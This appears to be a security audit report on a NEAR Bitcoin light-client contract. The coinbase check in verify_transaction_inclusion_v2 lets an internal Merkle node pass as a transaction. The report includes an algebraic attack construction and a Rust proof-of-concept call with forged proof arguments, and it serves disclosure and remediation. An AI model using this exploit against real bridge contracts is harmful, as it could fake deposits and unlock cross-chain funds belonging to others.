### Title
Insufficient Coinbase Anchor in `verify_transaction_inclusion_v2` Allows Internal Merkle Node to Pass as Valid Transaction — (`contract/src/lib.rs`, `merkle-tools/src/lib.rs`)

---

### Summary

`verify_transaction_inclusion_v2` was introduced to mitigate the 64-byte Merkle proof forgery vulnerability by requiring a coinbase proof. However, the coinbase check only verifies that `coinbase_tx_id` can reconstruct the `merkle_root` at position 0 — it does **not** verify that `coinbase_tx_id` is the actual coinbase transaction (the real tx at index 0 in the block). An attacker can substitute any internal Merkle node that sits at an even position in any level of the tree, pass the coinbase check, and then prove inclusion of that same internal node as a "transaction", causing the function to return `true` for a hash that is not a real transaction.

---

### Finding Description

**Entrypoint**: `verify_transaction_inclusion_v2` is a public NEAR contract view function, callable by any account with no access control. [1](#0-0) 

The function performs two checks:

**Check 1 — Coinbase anchor** (lines 358–365): verifies that `compute_root_from_merkle_proof(coinbase_tx_id, 0, &coinbase_merkle_proof) == merkle_root`. [2](#0-1) 

**Check 2 — Transaction inclusion** (delegated to `verify_transaction_inclusion`, lines 317–322): verifies that `compute_root_from_merkle_proof(tx_id, tx_index, &merkle_proof) == merkle_root`. [3](#0-2) 

`compute_root_from_merkle_proof` is a pure hash-chaining function with no validation that its input is a real transaction hash: [4](#0-3) 

**The missing invariant**: nowhere in the contract is `coinbase_tx_id` checked against the actual coinbase transaction stored in the block, nor is there any check that `coinbase_tx_id != tx_id` or that `coinbase_tx_id` is a leaf-level hash. The only constraint is that it reconstructs the root at position 0.

**Attack construction for a block with 4 transactions** `[tx0, tx1, tx2, tx3]`:

```
h01 = hash(tx0, tx1)   // internal node, level 1, position 0
h23 = hash(tx2, tx3)   // internal node, level 1, position 1
merkle_root = hash(h01, h23)
```

The attacker submits:
```
coinbase_tx_id        = h01   // internal node, NOT the real coinbase tx0
coinbase_merkle_proof = [h23] // length 1

tx_id        = h01            // same internal node
tx_index     = 0
merkle_proof = [h23]          // same, satisfies length equality check
```

- Coinbase check: `compute_root_from_merkle_proof(h01, 0, [h23])` = `hash(h01, h23)` = `merkle_root` ✓
- Tx check: `compute_root_from_merkle_proof(h01, 0, [h23])` = `hash(h01, h23)` = `merkle_root` ✓
- `merkle_proof.is_empty()` guard at line 315 is satisfied (length = 1) ✓
- `merkle_proof.len() == coinbase_merkle_proof.len()` is satisfied ✓

**Result**: `verify_transaction_inclusion_v2` returns `true` for `tx_id = h01`, which is an internal Merkle node and not a real Bitcoin transaction.

**Why the specific 2-tx / empty-proof scenario in the question fails**: setting `coinbase_tx_id = merkle_root` with `coinbase_merkle_proof = []` forces `merkle_proof = []` (length equality), which triggers the `require!(!args.merkle_proof.is_empty())` guard at line 315 and panics. The attack requires proof depth ≥ 1, i.e., a block with ≥ 4 transactions (or any block where an internal node at level 1 exists). [5](#0-4) 

---

### Impact Explanation

Any downstream system that calls `verify_transaction_inclusion_v2` and trusts its `true` return value to confirm a Bitcoin transaction is in a block can be deceived. The attacker proves inclusion of `h01` — a 32-byte internal Merkle node — as if it were a real transaction. This directly breaks the stated invariant of the function and the purpose of the v2 upgrade (mitigating the 64-byte forgery attack). Concrete downstream consequences include: falsely crediting a BTC deposit, unlocking cross-chain assets, or bypassing fraud proofs that rely on this verification.

---

### Likelihood Explanation

- The function is publicly callable with no access control.
- All inputs (`h01`, `h23`) are deterministically computable from any block's public transaction list.
- No cryptographic hardness assumption is required — the attack is purely algebraic.
- Any block with ≥ 4 transactions (the vast majority of Bitcoin blocks) is exploitable.

---

### Recommendation

The coinbase check must enforce that `coinbase_tx_id` is the **actual coinbase transaction** at index 0 in the block, not merely any hash that reconstructs the root at position 0. The correct fix is to require that the caller also provides the raw coinbase transaction bytes, compute its txid on-chain, and verify `computed_txid == coinbase_tx_id`. Alternatively, enforce `tx_index != 0` when `tx_id != coinbase_tx_id`, and reject any call where `coinbase_tx_id` equals `tx_id` unless `tx_index == 0`. The deeper structural fix is to validate that `coinbase_tx_id` is a real 32-byte txid derived from a parseable transaction, not an internal node — which requires passing the raw coinbase transaction for on-chain deserialization and hashing.

---

### Proof of Concept

For a block with 4 transactions `[tx0, tx1, tx2, tx3]` already submitted to the contract:

```rust
// Compute internal nodes
let h01 = double_sha256(&[tx0.0, tx1.0].concat()); // hash(tx0, tx1)
let h23 = double_sha256(&[tx2.0, tx3.0].concat()); // hash(tx2, tx3)
// merkle_root = hash(h01, h23) — matches block header

let result: bool = user_account
    .view(contract.id(), "verify_transaction_inclusion_v2")
    .args_borsh(ProofArgsV2 {
        tx_id: h01,                    // internal node, NOT a real tx
        tx_block_blockhash: block_hash,
        tx_index: 0,
        merkle_proof: vec![h23],       // length 1, non-empty
        coinbase_tx_id: h01,           // same internal node
        coinbase_merkle_proof: vec![h23],
        confirmations: 0,
    })
    .await?
    .json()?;

assert!(result); // returns true — h01 is not a real transaction
``` [6](#0-5) [7](#0-6)

### Citations

**File:** contract/src/lib.rs (L315-315)
```rust
        require!(!args.merkle_proof.is_empty(), "Merkle proof is empty");
```

**File:** contract/src/lib.rs (L317-322)
```rust
        // compute merkle tree root and check if it matches block's original merkle tree root
        merkle_tools::compute_root_from_merkle_proof(
            args.tx_id,
            usize::try_from(args.tx_index).unwrap(),
            &args.merkle_proof,
        ) == header.block_header.merkle_root
```

**File:** contract/src/lib.rs (L347-368)
```rust
    pub fn verify_transaction_inclusion_v2(&self, #[serializer(borsh)] args: ProofArgsV2) -> bool {
        require!(
            args.merkle_proof.len() == args.coinbase_merkle_proof.len(),
            "Coinbase merkle proof and transaction merkle proof should have the same length"
        );

        let header = self
            .headers_pool
            .get(&args.tx_block_blockhash)
            .unwrap_or_else(|| env::panic_str("cannot find requested transaction block"));

        require!(
            merkle_tools::compute_root_from_merkle_proof(
                args.coinbase_tx_id.clone(),
                0usize,
                &args.coinbase_merkle_proof,
            ) == header.block_header.merkle_root,
            "Incorrect coinbase merkle proof"
        );

        #[allow(deprecated)]
        self.verify_transaction_inclusion(args.into())
```

**File:** merkle-tools/src/lib.rs (L33-52)
```rust
#[must_use]
pub fn compute_root_from_merkle_proof(
    transaction_hash: H256,
    transaction_position: usize,
    merkle_proof: &Vec<H256>,
) -> H256 {
    let mut current_hash = transaction_hash;
    let mut current_position = transaction_position;

    for proof_hash in merkle_proof {
        if current_position % 2 == 0 {
            current_hash = compute_hash(&current_hash, proof_hash);
        } else {
            current_hash = compute_hash(proof_hash, &current_hash);
        }
        current_position /= 2;
    }

    current_hash
}
```

**File:** btc-types/src/contract_args.rs (L28-47)
```rust
pub struct ProofArgsV2 {
    pub tx_id: H256,
    pub tx_block_blockhash: H256,
    pub tx_index: u64,
    pub merkle_proof: Vec<H256>,
    pub coinbase_tx_id: H256,
    pub coinbase_merkle_proof: Vec<H256>,
    pub confirmations: u64,
}

impl From<ProofArgsV2> for ProofArgs {
    fn from(args: ProofArgsV2) -> Self {
        Self {
            tx_id: args.tx_id,
            tx_block_blockhash: args.tx_block_blockhash,
            tx_index: args.tx_index,
            merkle_proof: args.merkle_proof,
            confirmations: args.confirmations,
        }
    }
```
